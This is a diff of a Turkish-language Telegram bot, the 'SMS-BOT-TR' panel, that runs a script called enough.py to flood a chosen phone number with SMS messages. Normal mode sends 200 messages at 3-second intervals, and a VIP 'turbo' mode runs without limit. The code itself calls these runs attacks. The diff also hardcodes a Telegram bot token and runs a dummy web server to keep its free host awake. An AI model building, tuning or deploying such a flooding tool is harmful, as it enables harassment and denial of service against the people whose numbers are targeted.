@@ -7,19 +7,16 @@ import http.server
 import socketserver
 
 # --- AYARLAR ---
-# Kendi bot token'ını buraya tırnak içine yaz
 TOKEN = "8329769755:AAHmwTY0UWSu16pec8dhZFdq3Gtf8yiaaLw"
 bot = telebot.TeleBot(TOKEN)
 
 # --- YÖNETİCİ AYARLARI ---
-# Senin Telegram ID'n (Kurucu)
 OWNER_ID = 8523396063
 VIP_USERS = [OWNER_ID] 
 
-# Aktif işlemleri (saldırıları) takip etmek için
 aktif_islemler = {}
 
-# Render'ın botu uyutmaması için sahte sunucu
+# Render'ın uyumasını engelleyen sunucu
 def run_dummy_server():
     port = int(os.environ.get("PORT", 10000))
     handler = http.server.SimpleHTTPRequestHandler
@@ -35,15 +32,15 @@ threading.Thread(target=run_dummy_server, daemon=True).start()
 def operasyon_baslat(message, numara, mod_turu):
     user_id = message.from_user.id
     try:
-        # Girdi Zinciri: Mod -> Numara -> Mail(Enter) -> Adet(Enter) -> Aralık
         if mod_turu == "turbo":
             bot.send_message(message.chat.id, f"🚀 {numara} için **Turbo (Mod 2)** başlatıldı. Durdurana kadar devam eder!")
-            # 2 (Mod) -> Numara -> Enter (Mail)
+            # 2 (Mod) -> Numara -> Enter (Mail Boş)
             girdiler = f"2\n{numara}\n\n" 
         else:
-            bot.send_message(message.chat.id, f"✅ {numara} için **Normal (Mod 1)** başlatıldı...")
-            # 1 (Mod) -> Numara -> Enter (Dosya Değil) -> Enter (Mail) -> Enter (Sonsuz) -> 0 (Aralık)
-            girdiler = f"1\n{numara}\n\n\n\n0\n"
+            bot.send_message(message.chat.id, f"✅ {numara} için **Normal (Mod 1)** başlatıldı...\n🔢 Adet: 200\n⏱️ Aralık: 3 sn")
+            # SENİN SIRALAMAN: 
+            # 1 (Mod) -> Numara -> Enter (Mail Boş) -> 200 (Adet) -> 3 (Aralık)
+            girdiler = f"1\n{numara}\n\n200\n3\n"
 
         # Arka planda enough.py'yi çalıştırır
         process = subprocess.Popen(
@@ -58,7 +55,6 @@ def operasyon_baslat(message, numara, mod_turu):
         process.stdin.write(girdiler)
         process.stdin.flush()
         
-        # İşlem bitene kadar bekle (veya durdurulana kadar)
         process.wait()
         
         if user_id in aktif_islemler:
@@ -73,10 +69,10 @@ def operasyon_baslat(message, numara, mod_turu):
 def welcome(message):
     msg = (
         "🚀 **SMS-BOT-TR PANELİ** 🚀\n\n"
-        "👉 `/sms numara` (Normal Mod)\n"
+        "👉 `/sms numara` (200 Adet / 3 Saniye)\n"
         "👉 `/turbo numara` (Sonsuz VIP Mod)\n"
-        "👉 `/durdur` (İşlemi Kes)\n"
-        "👉 `/id` (ID numaranı öğren)"
+        "👉 `/durdur` (Saldırıyı Kes)\n"
+        "👉 `/id` (ID öğren)"
     )
     bot.reply_to(message, msg, parse_mode="Markdown")
 
@@ -85,24 +81,24 @@ def stop_attack(message):
     user_id = message.from_user.id
     if user_id in aktif_islemler:
         process = aktif_islemler[user_id]
-        process.kill() # Arka plandaki enough.py'yi kapatır (Ctrl+C etkisi)
+        process.kill() 
         del aktif_islemler[user_id]
-        bot.reply_to(message, "🛑 Saldırı durduruldu.")
+        bot.reply_to(message, "🛑 İşlem durduruldu.")
     else:
         bot.reply_to(message, "🧐 Şu an aktif bir işlemin yok.")
 
 @bot.message_handler(commands=['vip_ekle'])
 def add_vip(message):
     if message.from_user.id != OWNER_ID:
-        bot.reply_to(message, "❌ Bu komut sadece kurucuya aittir!")
+        bot.reply_to(message, "❌ Yetkin yok!")
         return
     try:
         yeni_id = int(message.text.split()[1])
         if yeni_id not in VIP_USERS:
             VIP_USERS.append(yeni_id)
-            bot.reply_to(message, f"✅ `{yeni_id}` VIP listesine eklendi.")
+            bot.reply_to(message, f"✅ `{yeni_id}` VIP yapıldı.")
     except:
-        bot.reply_to(message, "❌ Kullanım: `/vip_ekle ID`")
+        bot.reply_to(message, "❌ Kullanım: /vip_ekle ID")
 
 @bot.message_handler(commands=['id'])
 def get_id(message):
